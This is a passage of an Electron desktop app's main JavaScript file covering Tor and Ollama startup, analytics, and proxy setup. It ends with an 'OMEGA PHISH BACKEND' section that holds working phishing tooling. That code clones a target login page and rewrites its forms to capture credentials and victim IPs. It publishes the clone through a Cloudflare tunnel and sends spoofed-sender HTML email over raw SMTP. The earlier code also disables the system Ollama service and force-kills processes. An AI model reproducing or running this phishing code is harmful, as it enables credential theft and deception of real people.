      console.log('Intercepted webview session:', webviewSession.getPartition ? webviewSession.getPartition() : 'default');
    }

    // Also monitor navigation events as backup
    contents.on('did-navigate', (event, url) => {
      logWebviewRequest(url, 'GET');
    });

    contents.on('did-navigate-in-page', (event, url, isMainFrame) => {
      if (isMainFrame) {
        logWebviewRequest(url, 'GET');
      }
    });

    // Monitor failed requests too
    contents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
      console.log('did-fail-load event:', validatedURL);
      if (validatedURL && !validatedURL.startsWith('chrome-extension://') && !validatedURL.startsWith('chrome://') && !validatedURL.startsWith('about:') && !validatedURL.startsWith('file://')) {
        logWebviewRequest(validatedURL, 'GET');
      }
    });

    // Monitor when page starts loading - captures all resource requests
    contents.on('did-start-loading', () => {
      const url = contents.getURL();
      console.log('did-start-loading event:', url);
      if (url && !url.startsWith('chrome-extension://') && !url.startsWith('chrome://') && !url.startsWith('about:') && !url.startsWith('file://')) {
        logWebviewRequest(url, 'GET');
      }
    });
  });

  console.log('web-contents-created listener registered');
}

app.whenReady().then(async () => {
  // Track app launch
  if (analytics) {
    try {
      await analytics.trackLaunch();
      analytics.startHeartbeat();
    } catch (e) {
      console.warn('[Main] Analytics tracking failed:', e.message);
    }
  }

  // Initialize and start Tor automatically (if available)
  if (torManager) {
    console.log('[Tor] Checking for Tor installation...');
    try {
      // First, clean up any leftover Tor processes from previous sessions
      console.log('[Tor] Cleaning up any leftover Tor processes...');
      await torManager.killAllTorProcesses();
      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for cleanup

      await torManager.initialize();
      console.log('[Tor] Starting Tor daemon automatically...');
      await torManager.start();
      console.log('[Tor] ✅ Tor is running and ready for VPN connections');
    } catch (e) {
      console.warn('[Tor] ⚠️  Tor not available:', e.message);
      console.warn('[Tor] VPN locations will still work but traffic won\'t be routed through Tor');
      console.warn('[Tor] To enable Tor: Install Tor Browser or Tor Expert Bundle from https://www.torproject.org/download/');
    }
  } else {
    console.log('[Tor] Tor manager not available (optional feature)');
  }

  // Initialize Whisper Service (P2P Messenger) - requires Tor
  if (whisperService) {
    // Wait a moment for Tor to be fully ready if it was just started
    setTimeout(async () => {
      try {
        console.log('[Whisper] Initializing Whisper P2P Messenger service...');
        await whisperService.initialize();
        console.log('[Whisper] Service initialized successfully');
      } catch (e) {
        console.warn('[Whisper] Failed to initialize service:', e.message);
      }
    }, 5000); // Wait 5s for Tor to stabilize
  }

  // Start Ollama for AI features - prefer system installation, fallback to bundled
  try {
    const { ElectronOllama } = require('electron-ollama');
    const { exec } = require('child_process');
    const util = require('util');
    const execPromise = util.promisify(exec);
    const http = require('http');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');

    // Step 1: Check if Ollama is already running (system or bundled)
    let ollamaRunning = false;
    try {
      await new Promise((resolve, reject) => {
        const req = http.get('http://127.0.0.1:11434/api/tags', { timeout: 2000 }, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(true));
        });
        req.on('error', reject);
        req.on('timeout', () => {
          req.destroy();
          reject(new Error('timeout'));
        });
      });
      ollamaRunning = true;
      console.log('[Ollama] ✅ Ollama is already running on port 11434!');
    } catch (e) {
      // Not running yet
      console.log('[Ollama] Ollama not running, checking for system installation...');
    }

    // Step 2: Check if system Ollama is installed (before killing anything)
    let systemOllamaPath = null;
    if (!ollamaRunning) {
      const commonPaths = [
        path.join(process.env.LOCALAPPDATA || '', 'Programs', 'Ollama', 'ollama.exe'),
        'C:\\Program Files\\Ollama\\ollama.exe',
        path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Ollama', 'ollama.exe'),
      ];

      // Also check PATH
      try {
        await execPromise('ollama --version');
        // If this succeeds, ollama is in PATH
        systemOllamaPath = 'ollama'; // Use PATH version
        console.log('[Ollama] System Ollama found in PATH');
      } catch (e) {
        // Check common install locations
        for (const checkPath of commonPaths) {
          if (fs.existsSync(checkPath)) {
            systemOllamaPath = checkPath;
            console.log('[Ollama] System Ollama found at:', systemOllamaPath);
            break;
          }
        }
      }

      // Step 3: If system Ollama is installed, start it instead of bundled
      if (systemOllamaPath) {
        try {
          console.log('[Ollama] Starting system Ollama...');
          const { spawn } = require('child_process');

          // Start system Ollama
          const ollamaProcess = spawn(systemOllamaPath, ['serve'], {
            detached: true,
            stdio: 'ignore',
          });
          ollamaProcess.unref();

          // Wait for it to start
          console.log('[Ollama] Waiting for system Ollama to start...');
          for (let i = 0; i < 20; i++) { // Wait up to 20 seconds
            await new Promise(resolve => setTimeout(resolve, 1000));
            try {
              await new Promise((resolve, reject) => {
                const req = http.get('http://127.0.0.1:11434/api/tags', { timeout: 2000 }, (res) => {
                  resolve(true);
                });
                req.on('error', reject);
                req.on('timeout', () => {
                  req.destroy();
                  reject(new Error('timeout'));
                });
              });
              ollamaRunning = true;
              console.log('[Ollama] ✅ System Ollama started successfully!');
              break;
            } catch (e) {
              // Keep waiting
            }
          }

          if (!ollamaRunning) {
            console.warn('[Ollama] System Ollama failed to start within timeout, will try bundled...');
          }
        } catch (error) {
          console.error('[Ollama] Error starting system Ollama:', error.message);
          console.log('[Ollama] Falling back to bundled Ollama...');
        }
      }
    }

    // Step 4: Only if system Ollama is not running/available, use bundled
    if (!ollamaRunning) {
      // Only clean up if we're going to use bundled (don't kill system Ollama we just started)
      if (!systemOllamaPath) {
        try {
          console.log('[Ollama] Cleaning up any existing Ollama processes for bundled version...');

          // Method 1: Try to stop and disable Ollama service
          try {
            await execPromise('sc stop ollama 2>nul');
            await new Promise(resolve => setTimeout(resolve, 500));
            await execPromise('sc config ollama start= disabled 2>nul');
            await new Promise(resolve => setTimeout(resolve, 200));
          } catch (e) {
            // Service might not exist - that's okay
          }

          // Method 2: Kill ALL Ollama processes (only if system wasn't found)
          for (let i = 0; i < 3; i++) {
            try {
              await execPromise('taskkill /F /IM ollama.exe /T 2>nul');
              await execPromise('taskkill /F /IM "ollama app.exe" /T 2>nul');
              await new Promise(resolve => setTimeout(resolve, 300));
            } catch (e) {
              // Process might not be running
            }
          }

          // Method 3: Find and kill process using port 11434 (multiple attempts)
          for (let attempt = 0; attempt < 3; attempt++) {
            try {
              const { stdout } = await execPromise('netstat -ano | findstr :11434');
              if (!stdout || stdout.trim().length === 0) {
                // Port is free
                break;
              }
              const lines = stdout.trim().split('\n').filter(line => line.trim());
              const pids = new Set();
              for (const line of lines) {
                const parts = line.trim().split(/\s+/);
                if (parts.length >= 5) {
                  const pid = parts[parts.length - 1];
                  if (pid && !isNaN(parseInt(pid))) {
                    pids.add(pid);
                  }
                }
              }
              if (pids.size === 0) {
                break; // No PIDs found, port should be free
              }
              for (const pid of pids) {
                try {
                  await execPromise(`taskkill /F /PID ${pid} 2>nul`);
                  console.log(`[Ollama] Killed process ${pid} using port 11434`);
                } catch (e) {
                  // Process might already be gone
                }
              }
              // Wait a bit before checking again
              await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {
              // Port might not be in use or command failed
              break;
            }
          }

          // Final check - wait longer for port to be fully released
          await new Promise(resolve => setTimeout(resolve, 2000));

          // Verify port is free - if not, keep trying
          let portFree = false;
          for (let checkAttempt = 0; checkAttempt < 5; checkAttempt++) {
            try {
              const { stdout } = await execPromise('netstat -ano | findstr :11434');
              if (!stdout || stdout.trim().length === 0) {
                portFree = true;
                console.log('[Ollama] Port 11434 is now free');
                break;
              } else {
                // Port still in use - try killing again
                const lines = stdout.trim().split('\n').filter(line => line.trim());
                for (const line of lines) {
                  const parts = line.trim().split(/\s+/);
                  if (parts.length >= 5) {
                    const pid = parts[parts.length - 1];
                    if (pid && !isNaN(parseInt(pid))) {
                      try {
                        await execPromise(`taskkill /F /PID ${pid} 2>nul`);
                        console.log(`[Ollama] Killed remaining process ${pid}`);
                      } catch (e) { }
                    }
                  }
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
              }
            } catch (e) {
              // Command failed, assume port is free
              portFree = true;
              break;
            }
          }

          if (!portFree) {
            console.warn('[Ollama] WARNING: Port 11434 is still in use after cleanup - bundled Ollama may fail to start');
          }

          console.log('[Ollama] Cleaned up existing Ollama instances');
        } catch (e) {
          // Ignore errors
          console.log('[Ollama] Cleanup attempted');
        }

        // Final wait and verification before starting
        console.log('[Ollama] Waiting for port to be fully released...');
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      // Step 5: Start bundled Ollama
      console.log('[Ollama] Starting bundled Ollama...');
      const ollama = new ElectronOllama({
        basePath: app.getPath('userData'),
      });

      // Check if bundled Ollama is already running
      const isBundledRunning = await ollama.isRunning();

      if (isBundledRunning) {
        console.log('[Ollama] ✅ Bundled Ollama is already running');
      } else {
        // Start bundled Ollama - properly wait for download and startup
        try {
          let metadata;
          let downloadComplete = false;
          let downloadPercent = 0;

          try {
            metadata = await ollama.getMetadata('latest');
          } catch (metadataError) {
            // Check if it's a GitHub rate limit error
            if (metadataError.message && (
              metadataError.message.includes('rate limit') ||
              metadataError.message.includes('API rate limit') ||
              metadataError.message.includes('ENOTFOUND') ||
              metadataError.message.includes('GitHub')
            )) {
              console.warn('[Ollama] ⚠️ GitHub API rate limit exceeded. Checking if Ollama is already installed...');
              // Check if Ollama binary already exists (from previous download)
              const userDataPath = app.getPath('userData');
              const possiblePaths = [
                path.join(userDataPath, 'ollama', 'ollama.exe'),
                path.join(userDataPath, 'ollama', 'ollama'),
                path.join(userDataPath, '.ollama', 'ollama.exe'),
              ];

              let existingPath = null;
              for (const checkPath of possiblePaths) {
                if (fs.existsSync(checkPath)) {
                  existingPath = checkPath;
                  break;
                }
              }

              if (existingPath) {
                console.log('[Ollama] Found existing bundled Ollama installation');
                try {
                  metadata = await ollama.getMetadata(); // Try without 'latest' to use cached version
                } catch (e) {
                  console.warn('[Ollama] Could not get metadata. Checking if Ollama is already running...');
                  // Check if it's already running
                  try {
                    await new Promise((resolve, reject) => {
                      const req = http.get('http://127.0.0.1:11434/api/tags', { timeout: 3000 }, (res) => {
                        resolve(true);
                      });
                      req.on('error', reject);
                      req.on('timeout', () => {
                        req.destroy();
                        reject(new Error('timeout'));
                      });
                    });
                    console.log('[Ollama] ✅ Ollama is already running!');
                    downloadComplete = true;
                  } catch (e) {
                    console.warn('[Ollama] ⚠️ GitHub rate limit and Ollama not running. Please wait for download to complete or install manually.');
                    throw metadataError;
                  }
                }
              } else {
                console.warn('[Ollama] ⚠️ GitHub rate limit and no existing Ollama found. AI features will be unavailable.');
                console.warn('[Ollama] 💡 Tip: Install Ollama manually from https://ollama.ai or wait for GitHub rate limit to reset.');
                throw metadataError;
              }
            } else {
              throw metadataError;
            }
          }

          // Start bundled Ollama if we have metadata
          if (metadata && !downloadComplete) {
            console.log('[Ollama] Starting bundled Ollama download and startup (this may take a few minutes)...');

            // Start the download/startup process
            const servePromise = ollama.serve(metadata.version, {
              serverLog: (message) => {
                console.log('[Ollama]', message);
              },
              downloadLog: (percent, message) => {
                downloadPercent = percent;
                if (percent % 10 === 0 || percent === 100) {
                  console.log(`[Ollama Download] ${percent}% - ${message}`);
                }
                if (percent === 100) {
                  downloadComplete = true;
                }
              },
            });

            // Wait for download to complete (with timeout)
            const maxWaitTime = 600000; // 10 minutes max
            const startTime = Date.now();
            let serveCompleted = false;

            // Monitor download progress and wait for serve to complete
            servePromise.then(() => {
              serveCompleted = true;
              console.log('[Ollama] ✅ Bundled Ollama started successfully');
            }).catch((err) => {
              if (!err.message || !err.message.includes('failed to start in 5s')) {
                console.error('[Ollama] Serve error:', err.message);
              }
            });

            // Wait for download to reach 100% or serve to complete
            while (!downloadComplete && !serveCompleted && (Date.now() - startTime) < maxWaitTime) {
              await new Promise(resolve => setTimeout(resolve, 2000));
            }

            // After download completes, wait for Ollama to actually start responding
            console.log('[Ollama] Download complete. Waiting for Ollama to start...');
            for (let i = 0; i < 60; i++) { // Wait up to 60 seconds for startup
              await new Promise(resolve => setTimeout(resolve, 1000));
              try {
                await new Promise((resolve, reject) => {
                  const req = http.get('http://127.0.0.1:11434/api/tags', { timeout: 3000 }, (res) => {
                    resolve(true);
                  });
                  req.on('error', reject);
                  req.on('timeout', () => {
                    req.destroy();
                    reject(new Error('timeout'));
                  });
                });
                console.log('[Ollama] ✅ Bundled Ollama is running and responding!');
                downloadComplete = true;
                break;
              } catch (e) {
                // Keep waiting
                if (i % 10 === 0) {
                  console.log(`[Ollama] Still waiting for Ollama to start... (${i + 1}/60)`);
                }
              }
            }

            if (!downloadComplete) {
              console.warn('[Ollama] ⚠️ Ollama did not start within timeout. AI features may not work yet.');
              console.warn('[Ollama] The download may still be in progress. AI features will work once Ollama is ready.');
            }
          }
        } catch (error) {
          console.error('[Ollama] Error starting bundled Ollama:', error.message);
          if (error.message && error.message.includes('bind')) {
            console.warn('[Ollama] Port 11434 is still in use. Please manually stop your system Ollama service.');
          } else if (error.message && error.message.includes('rate limit')) {
            console.warn('[Ollama] ⚠️ GitHub API rate limit exceeded. Please install Ollama manually from https://ollama.ai');
          }
        }
      }
    }
  } catch (error) {
    console.error('[Ollama] Error initializing bundled Ollama:', error);
    // Continue anyway - AI features will show error messages
  }


  // TOR HARDENING: Set consistent User-Agent (standardized for fingerprinting protection)
  // Use a consistent, common User-Agent that doesn't expose Electron version or unique details
  const standardUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  session.defaultSession.setUserAgent(standardUserAgent);
  console.log('[Tor Hardening] User agent standardized for fingerprinting protection');

  // TOR HARDENING: Block dangerous protocols via webRequest
  // FTP and other non-HTTP protocols are blocked by Chromium security by default
  // chrome:// and devtools:// are blocked by Chromium's security model
  // file:// is only allowed for local app files (sandboxed, webSecurity enabled)
  session.defaultSession.webRequest.onBeforeRequest({ urls: ['ftp://*/*'] }, (details, callback) => {
    console.warn('[Tor Hardening] Blocked FTP protocol request:', details.url);
    callback({ cancel: true });
  });

  // Configure proxy/VPN if specified
  if (PROXY_SERVER) {
    session.defaultSession.setProxy({
      proxyRules: PROXY_SERVER
    });
    console.log('VPN/Proxy configured:', PROXY_SERVER);

    // Handle Chromium cache errors gracefully when using VPN/Proxy
    // These errors are common with proxy/VPN but don't affect functionality
    const originalConsoleError = console.error;
    console.error = function (...args) {
      const message = args.join(' ');
      // Filter out common Chromium cache errors that occur with VPN/proxy
      // These are harmless cache corruption issues that Chromium handles automatically
      if (message.includes('backend_impl.cc') ||
        message.includes('entry_impl.cc') ||
        message.includes('Critical error found') ||
        (message.includes('No file for') && message.length < 100)) {
        // Suppress these specific cache errors - they're handled by Chromium
        // Only suppress if it's a short message (to avoid hiding real errors)
        return;
      }
      originalConsoleError.apply(console, args);
    };

  }

  // Extensions disabled - using Omega Wallet as native provider instead
  // MetaMask/Phantom extensions removed due to Electron limitations
  // Omega Wallet will inject as window.ethereum and window.solana
  console.log('Using Omega Wallet as native wallet provider (extensions disabled)');

  // Setup firewall network request interceptor
  setupFirewallInterceptor();

  createDesktopWindow();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createDesktopWindow();
    }
  });
});

app.on('window-all-closed', async () => {
  if (process.platform !== 'darwin') {
    // Track app close before quitting
    if (analytics) {
      analytics.trackClose().catch(e => console.warn('[Main] Analytics close tracking failed:', e.message));
    }
    // Aggressively stop and kill all Tor processes
    if (torManager) {
      try {
        await torManager.stop();
        // Give it a moment, then kill all Tor processes as backup
        await new Promise(resolve => setTimeout(resolve, 1000));
        await torManager.killAllTorProcesses();
      } catch (e) {
        console.warn('[Main] Tor stop failed:', e.message);
        // Try to kill processes anyway
        if (torManager.killAllTorProcesses) {
          await torManager.killAllTorProcesses().catch(() => { });
        }
      }
    }
    app.quit();
  }
});

// Track app close on quit
app.on('before-quit', async (event) => {
  // Prevent default quit to allow cleanup
  event.preventDefault();

  if (analytics) {
    try {
      await analytics.trackClose();
    } catch (e) {
      console.warn('[Main] Analytics close tracking failed:', e.message);
    }
  }

  // Aggressively stop and kill all Tor processes
  if (torManager) {
    try {
      console.log('[Main] Stopping Tor before quit...');
      await torManager.stop();
      // Give it a moment, then kill all Tor processes as backup
      await new Promise(resolve => setTimeout(resolve, 1000));
      await torManager.killAllTorProcesses();
      console.log('[Main] Tor cleanup complete');
    } catch (e) {
      console.warn('[Main] Tor stop failed:', e.message);
      // Try to kill processes anyway
      if (torManager.killAllTorProcesses) {
        await torManager.killAllTorProcesses().catch(() => { });
      }
    }
  }

  // Now actually quit
  app.exit(0);
});



// ---------------- OMEGA PHISH BACKEND ---------------- //
let phishServer = null;
let cloudflaredProcess = null;
const { spawn } = require('child_process');
// path is already required at top of file

// Helper for SMTP Logging
function smtpLog(event, msg) {
  event.sender.send('phish-log', { type: 'sys', msg: `[SMTP] ${msg}` });
}

ipcMain.handle('phish-start-server', async (event, { url, port, redirect, useNgrok = true }) => {
  // IMMEDIATE VERIFICATION
  event.sender.send('phish-log', { type: 'success', msg: `✅ CLOUDFLARE INTEGRATION LOADED!` });

  return new Promise(async (resolve) => {
    try {
      // Stop existing server and ngrok tunnel
      if (phishServer) {
        phishServer.close();
        phishServer = null;
      }
      if (cloudflaredProcess) {
        try {
          cloudflaredProcess.kill();
          cloudflaredProcess = null;
        } catch (e) {
          console.warn('[Cloudflare] Error stopping previous tunnel:', e.message);
        }
      }

      // 1. SCRAPE
      if (!url.startsWith('http')) url = 'http://' + url;
      const adapter = url.startsWith('https') ? nodeHttps : nodeHttp;

      event.sender.send('phish-log', { type: 'sys', msg: `Fetching ${url}...` });

      const options = {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
      };

      const req = adapter.get(url, options, (res) => {
        let html = '';
        res.on('data', c => html += c);
        res.on('end', async () => {
          // 2. MODIFY HTML
          let hackedHtml = html.replace(/<form[^>]*>/gi, (match) => `<form action="/login" method="POST">`);

          try {
            const urlObj = new URL(url);
            const origin = urlObj.origin;
            hackedHtml = hackedHtml.replace(/(href|src)=["']\/([^"']*)["']/gi, `$1="${origin}/$2"`);
          } catch (e) { }

          // 3. START SERVER
          phishServer = nodeHttp.createServer((req, serverRes) => {
            const clientIp = req.socket.remoteAddress;

            if (req.method === 'POST' && req.url === '/login') {
              let body = '';
              req.on('data', chunk => body += chunk.toString());
              req.on('end', () => {
                const creds = {};
                const params = new URLSearchParams(body);
                for (const [key, value] of params) creds[key] = value;

                event.sender.send('phish-log', { type: 'cred', ip: clientIp, creds: creds });
                serverRes.writeHead(302, { 'Location': redirect || url });
                serverRes.end();
              });
            } else {
              serverRes.writeHead(200, { 'Content-Type': 'text/html' });
              serverRes.end(hackedHtml);
              event.sender.send('phish-log', { type: 'sys', msg: `Hit from ${clientIp}` });
            }
          });

          phishServer.listen(port, async () => {
            const localLink = `http://localhost:${port}`;
            event.sender.send('phish-log', { type: 'success', msg: `✅ SITE CLONED! Hosting at: ${localLink}` });

            // 4. START CLOUDFLARE TUNNEL (if enabled)
            let publicUrl = localLink;

            if (useNgrok) {
              try {
                event.sender.send('phish-log', { type: 'sys', msg: `🌐 Starting Cloudflare Tunnel...` });
                console.log('[PHISH] Starting Cloudflare Tunnel on port', port);

                // Path to cloudflared.exe
                const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');

                // Spawn cloudflared process
                cloudflaredProcess = spawn(cloudflaredPath, ['tunnel', '--url', `http://localhost:${port}`]);

                // Capture the public URL from cloudflared output
                const urlPromise = new Promise((resolveUrl, rejectUrl) => {
                  let urlFound = false;
                  const timeout = setTimeout(() => {
                    if (!urlFound) rejectUrl(new Error('Timeout waiting for Cloudflare URL'));
                  }, 30000); // 30 second timeout

                  cloudflaredProcess.stdout.on('data', (data) => {
                    const output = data.toString();
                    const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
                    if (urlMatch && !urlFound) {
                      urlFound = true;
                      clearTimeout(timeout);
                      resolveUrl(urlMatch[0]);
                    }
                  });

                  cloudflaredProcess.stderr.on('data', (data) => {
                    const output = data.toString();
                    const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
                    if (urlMatch && !urlFound) {
                      urlFound = true;
                      clearTimeout(timeout);
                      resolveUrl(urlMatch[0]);
                    }
                  });

                  cloudflaredProcess.on('error', (err) => {
                    clearTimeout(timeout);
                    rejectUrl(err);
                  });
                });

                // Wait for URL
                publicUrl = await urlPromise;

                console.log('[PHISH] Cloudflare Tunnel created:', publicUrl);
                event.sender.send('phish-log', { type: 'success', msg: `🌐 PUBLIC URL: ${publicUrl}` });
                event.sender.send('phish-log', { type: 'success', msg: `✨ No warning page - direct access!` });
                event.sender.send('phish-link-generated', publicUrl);

              } catch (e) {
                console.error('[PHISH] Cloudflare Tunnel error:', e);
                event.sender.send('phish-log', { type: 'sys', msg: `⚠️ Cloudflare Tunnel failed: ${e.message}. Using local URL only.` });
                event.sender.send('phish-link-generated', localLink);
              }
            } else {
              console.log('[PHISH] Public tunnel disabled, using local URL only');
              event.sender.send('phish-link-generated', localLink);
            }

            resolve({ success: true, link: publicUrl, localLink: localLink });
          });

          phishServer.on('error', (e) => {
            event.sender.send('phish-log', { type: 'sys', msg: `Server Error: ${e.message}` });
          });

        });
      });

      req.on('error', (e) => {
        resolve({ success: false, error: 'Scrape failed: ' + e.message });
      });

    } catch (e) {
      resolve({ success: false, error: e.message });
    }
  });
});

ipcMain.handle('phish-stop-server', async () => {
  if (phishServer) {
    phishServer.close();
    phishServer = null;
  }
  if (cloudflaredProcess) {
    try {
      cloudflaredProcess.kill();
      cloudflaredProcess = null;
    } catch (e) {
      console.warn('[Cloudflare] Error stopping tunnel:', e.message);
    }
  }
  return { success: true };
});

// Manual Cloudflare Tunnel
ipcMain.handle('start-cloudflare-tunnel', async (event, { port }) => {
  return new Promise((resolve) => {
    try {
      const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');
      const tunnel = spawn(cloudflaredPath, ['tunnel', '--url', `http://localhost:${port}`]);
      let urlFound = false;
      const timeout = setTimeout(() => {
        if (!urlFound) resolve({ success: false, error: 'Timeout' });
      }, 30000);
      tunnel.stdout.on('data', (data) => {
        const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (match && !urlFound) {
          urlFound = true;
          clearTimeout(timeout);
          cloudflaredProcess = tunnel;
          resolve({ success: true, url: match[0] });
        }
      });
      tunnel.stderr.on('data', (data) => {
        const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (match && !urlFound) {
          urlFound = true;
          clearTimeout(timeout);
          cloudflaredProcess = tunnel;
          resolve({ success: true, url: match[0] });
        }
      });
      tunnel.on('error', (err) => {
        clearTimeout(timeout);
        resolve({ success: false, error: err.message });
      });
    } catch (e) {
      resolve({ success: false, error: e.message });
    }
  });
});

ipcMain.handle('phish-send-mail', async (event, conf) => {
  return new Promise((resolve) => {
    try {
      const isSecure = conf.port == 465;
      const netModule = isSecure ? require('tls') : nodeNet;

      smtpLog(event, `Connecting to ${conf.host}:${conf.port} (${isSecure ? 'SSL' : 'Plain'})...`);

      let socket;
      if (isSecure) {
        // SSL Connection (Port 465)
        socket = netModule.connect(conf.port, conf.host, { rejectUnauthorized: false }, () => {
          smtpLog(event, 'Connected securely.');
        });
      } else {
        // Plain TCP (Port 25/587 - Note: 587 needs STARTTLS which we skip for basic spoof attempt)
        socket = netModule.connect(conf.port, conf.host, () => {
          smtpLog(event, 'Connected (Plain).');
        });
      }

      socket.setEncoding('utf8');
      socket.setTimeout(20000); // Increased timeout

      let step = 'CONNECT';
      let buffer = '';

      socket.on('data', (data) => {
        buffer += data;
        if (!buffer.includes('\n')) return;

        const lines = buffer.split('\n');
        buffer = lines.pop();

        for (const line of lines) {
          const raw = line.trim();
          smtpLog(event, `S: ${raw}`);

          if (raw.startsWith('4') || raw.startsWith('5')) {
            if (raw.includes('535')) smtpLog(event, `❌ AUTH FAILED: Bad Username or App Password.`);
            else smtpLog(event, `❌ Error: ${raw}`);

            socket.destroy();
            resolve({ success: false, error: raw });
            return;
          }

          const code = parseInt(raw.substring(0, 3));
          if (isNaN(code)) continue;
          if (line.charAt(3) === '-') continue;

          // STATE MACHINE
          if (step === 'CONNECT' && code === 220) {
            step = 'EHLO';
            const cmd = `EHLO ${os.hostname()}`;
            socket.write(cmd + '\r\n');
            smtpLog(event, `C: ${cmd}`);
          }
          else if (step === 'EHLO' && code === 250) {
            if (conf.user && conf.pass) {
              step = 'AUTH_INIT';
              socket.write('AUTH LOGIN\r\n');
              smtpLog(event, `C: AUTH LOGIN`);
            } else {
              step = 'MAIL_FROM';
              const cmd = `MAIL FROM:<${conf.from}>`;
              socket.write(cmd + '\r\n');
              smtpLog(event, `C: ${cmd}`);
            }
          }
          else if (step === 'AUTH_INIT' && code === 334) {
            step = 'AUTH_USER';
            const start = Buffer.from(conf.user).toString('base64');
            socket.write(start + '\r\n');
            smtpLog(event, `C: [Username Base64]`);
          }
          else if (step === 'AUTH_USER' && code === 334) {
            step = 'AUTH_PASS';
            const pass = Buffer.from(conf.pass).toString('base64');
            socket.write(pass + '\r\n');
            smtpLog(event, `C: [Password Base64]`);
          }
          else if (step === 'AUTH_PASS' && code === 235) {
            step = 'MAIL_FROM';
            smtpLog(event, `✅ Authenticated!`);
            const cmd = `MAIL FROM:<${conf.from}>`;
            socket.write(cmd + '\r\n');
            smtpLog(event, `C: ${cmd}`);
          }
          else if (step === 'MAIL_FROM' && code === 250) {
            step = 'RCPT_TO';
            const cmd = `RCPT TO:<${conf.to}>`;
            socket.write(cmd + '\r\n');
            smtpLog(event, `C: ${cmd}`);
          }
          else if (step === 'RCPT_TO' && code === 250) {
            step = 'DATA';
            socket.write('DATA\r\n');
            smtpLog(event, `C: DATA`);
          }
          else if (step === 'DATA' && code === 354) {
            step = 'BODY';
            const message = `From: ${conf.from}\r\nTo: ${conf.to}\r\nSubject: ${conf.subject}\r\nContent-Type: text/html\r\n\r\n${conf.body}\r\n.\r\n`;
            socket.write(message);
            smtpLog(event, `C: (Sending Body...)`);
          }
          else if (step === 'BODY' && code === 250) {
            step = 'QUIT';
            socket.write('QUIT\r\n');
            smtpLog(event, `C: QUIT`);
            socket.end();
            resolve({ success: true, msg: 'Sent!' });
          }
        }
      });

      socket.on('error', (e) => {
        smtpLog(event, `Error: ${e.message}`);
        resolve({ success: false, error: e.message });
      });

      socket.on('timeout', () => {
        socket.destroy();
        resolve({ success: false, error: 'Connection Timed Out. Check Firewall/Port.' });
      });

    } catch (e) {
      resolve({ success: false, error: 'Backend Error: ' + e.message });
    }
  }); // End Promise
}); // End ipcMain handle
